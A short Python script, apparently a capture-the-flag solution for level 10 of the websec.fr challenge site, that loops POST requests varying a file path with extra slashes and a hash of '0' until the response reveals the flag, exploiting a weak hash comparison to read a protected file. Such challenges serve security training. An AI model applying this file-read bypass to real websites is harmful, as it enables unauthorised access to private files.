import requests
x=True
i=0
flag="./flag.php"
page="http://websec.fr/level10/index.php"
while (x==True):
    i+=1
    data={'f':flag,'hash':'0'}
    url=requests.post(page,data=data)
    if "WEBSEC{" in url.text:
        print(url.text)
        x=False
    flag="."+"/"*i+"flag.php"
    print(flag)
    
#level 10
